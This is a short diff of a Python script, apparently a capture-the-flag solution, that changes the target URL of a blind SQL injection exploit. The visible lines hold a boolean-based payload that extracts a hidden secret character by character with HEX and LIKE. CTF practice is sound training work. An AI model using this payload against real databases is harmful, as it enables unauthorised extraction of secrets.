@@ -30,7 +30,7 @@ class Inj:
 
 
 payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
-inj = Inj('http://web-17.challs.olicyber.it')
+inj = Inj('http://sqlinjection.challs.cyberchallenge.it')
 
 dictionary = '0123456789abcdef'
 result = ''
